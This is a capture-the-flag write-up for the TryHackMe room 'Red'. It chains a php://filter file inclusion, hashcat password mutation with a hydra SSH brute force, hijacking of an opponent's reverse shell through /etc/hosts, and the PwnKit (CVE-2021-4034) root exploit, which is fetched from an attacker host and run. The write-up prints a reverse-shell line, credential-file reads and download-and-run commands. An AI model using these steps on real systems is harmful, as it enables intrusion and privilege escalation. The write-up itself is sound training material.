# TryHackMe: Red — Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-Red-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)

> **Room:** [Red (redisl33t)](https://tryhackme.com/room/redisl33t)  
> **Objective:** Capture 3 flags while battling an active Red adversary on the same machine.

---

## Room Description

The match has started and Red has taken the lead. You are Blue, and only you can take Red down. However, Red has implemented several defensive mechanisms:

1. Red is known to kick opponents off the machine. Is there a way to bypass this?
2. Red likes changing opponent passwords but usually keeps them relatively the same.
3. Red likes to taunt opponents to throw them off. Stay alert!

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV <TARGET_IP>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
```

Two open ports: SSH and HTTP. The URL parameter `page=home.html` immediately suggests a potential Local File Inclusion (LFI) vulnerability.

---

## Flag 1 — User Blue

### Step 1: Confirming LFI

The `page` parameter loads files by name. To read the source code of `index.php` without executing it, we use a PHP filter wrapper to base64-encode the output:

```bash
curl "http://<TARGET_IP>/index.php?page=php://filter/convert.base64-encode/resource=index.php"
```

Decoding the base64 output reveals the source code:

```php
<?php 
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}
?>
```

**Key observations:**
- `str_replace("../", "")` — strips `../` but only in a single pass (bypassable with `....//`)
- `preg_match("/^[a-z]/", $page)` — input must start with a lowercase letter
- `readfile()` — reads and outputs file contents (supports PHP stream wrappers)

Since `php://` starts with a lowercase letter `p`, it passes the regex check and the path traversal filter has nothing to strip. This gives us a clean LFI vector.

### Step 2: Reading /etc/passwd

```bash
curl "http://<TARGET_IP>/index.php?page=php://filter/resource=/etc/passwd"
```

Two users with shell access identified:
- `blue` (uid 1000)
- `red` (uid 1001)

### Step 3: Extracting Password Clue

Reading Blue's bash history:

```bash
curl "http://<TARGET_IP>/index.php?page=php://filter/resource=/home/blue/.bash_history"
```

```
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
```

This tells us Red generated a password list from a `.reminder` file using hashcat's `best64.rule`. Reading the reminder file:

```bash
curl "http://<TARGET_IP>/index.php?page=php://filter/resource=/home/blue/.reminder"
```

Output: `sup3r_p@s$w0rd!`

### Step 4: Generating Password List and Brute-Forcing SSH

Replicate Red's exact process to generate the same password mutations:

```bash
echo 'sup3r_p@s$w0rd!' > reminder.txt
hashcat --stdout reminder.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt
hydra -l blue -P passlist.txt <TARGET_IP> ssh -t 4
```

Hydra finds valid credentials and we SSH in:

```bash
ssh blue@<TARGET_IP>
```

```bash
cat ~/flag1
```

> **Flag 1:** `THM{Is_thAt_all_y0u_can_d0_blU3?}`

---

## Flag 2 — User Red

### Understanding Red's Persistence

After logging in, Red actively interferes: kicking us out of SSH, changing passwords, and taunting us via terminal messages. Investigating running processes:

```bash
ps aux | grep red
```

```
red  14267  bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```

Red maintains a **reverse shell** connecting to `redrules.thm` on port `9001`. Checking `/etc/hosts`:

```
192.168.0.1 redrules.thm
```

The IP `192.168.0.1` is a non-routable address in the THM VPN — Red's C2 server.

### DNS Hijacking — Intercepting Red's Reverse Shell

The idea: redirect `redrules.thm` to our attacker machine so Red's reverse shell connects to **us** instead.

Checking file attributes:

```bash
lsattr /etc/hosts
```

The file has an **append-only** attribute, meaning we can only use `>>` (append), not `>` (overwrite). This is why direct overwrites fail silently.

**On attacker machine** — start a listener:

```bash
nc -lvnp 9001
```

**On target (as Blue)** — append our IP:

```bash
echo "<ATTACKER_TUN0_IP> redrules.thm" >> /etc/hosts
```

After a short wait, Red's cron job spawns a new reverse shell that resolves `redrules.thm` to our IP. We catch the connection:

```bash
cat /home/red/flag2
```

> **Flag 2:** `THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}`

---

## Flag 3 — Root

### Discovering the Vulnerable SUID Binary

Exploring Red's home directory:

```bash
ls -la /home/red/.git/
```

```
-rwsr-xr-x 1 root root 31032 Aug 14 2022 pkexec
```

A `pkexec` binary with the **SUID bit set** and owned by **root**. Checking its version:

```bash
/home/red/.git/pkexec --version
```

```
pkexec version 0.105
```

Version 0.105 is vulnerable to **CVE-2021-4034 (PwnKit)** — a privilege escalation vulnerability in PolicyKit's `pkexec` that allows any local user to gain root.

### Exploiting PwnKit

**On attacker machine** — download, modify, and compile the exploit:

```bash
git clone https://github.com/ly4k/PwnKit
cd PwnKit

# Point the exploit to the custom pkexec path
sed -i 's|/usr/bin/pkexec|/home/red/.git/pkexec|g' PwnKit.c

# Compile
gcc PwnKit.c -o PwnKit -Wl,-e,entry -nostartfiles -fPIC

# Serve it
python3 -m http.server 8888
```

**On target (as Red, via reverse shell):**

```bash
mkdir /tmp/pwn && cd /tmp/pwn
curl http://<ATTACKER_IP>:8888/PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit
```

```bash
whoami
# root

cat /root/flag3
```

> **Flag 3:** `THM{Go0d_Gam3_Blu3_GG}`

---

## Attack Chain Summary

```
LFI (php://filter)
  └─> Read /etc/passwd → Found users: blue, red
  └─> Read .bash_history → Discovered hashcat command with best64.rule
  └─> Read .reminder → Obtained base password
        │
        ▼
Password Mutation (hashcat best64.rule) + SSH Brute Force (hydra)
  └─> SSH as blue → Flag 1
        │
        ▼
DNS Hijacking (/etc/hosts append-only)
  └─> Redirected redrules.thm to attacker IP
  └─> Caught Red's reverse shell on port 9001 → Flag 2
        │
        ▼
PwnKit (CVE-2021-4034)
  └─> Exploited SUID pkexec v0.105 in /home/red/.git/
  └─> Root shell → Flag 3
```

---

## Key Takeaways

- **PHP stream wrappers** (`php://filter`) can bypass basic LFI sanitization — always validate against a whitelist, not a blacklist.
- **Bash history** often leaks operational details. Red's own commands revealed the exact password mutation strategy.
- **Append-only file attributes** (`chattr +a`) are a double-edged sword — they prevented us from overwriting `/etc/hosts`, but still allowed appending our own DNS entry.
- **Active adversary simulation** makes this room unique — persistence, quick action, and creative thinking are essential when an opponent is actively interfering.
- **SUID binaries** outside standard paths are always worth investigating — Red hid a vulnerable `pkexec` in a `.git` folder.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service enumeration |
| cURL | LFI exploitation and file reading |
| Hashcat | Password mutation with best64.rule |
| Hydra | SSH brute force |
| Netcat | Catching Red's reverse shell |
| PwnKit | CVE-2021-4034 privilege escalation |
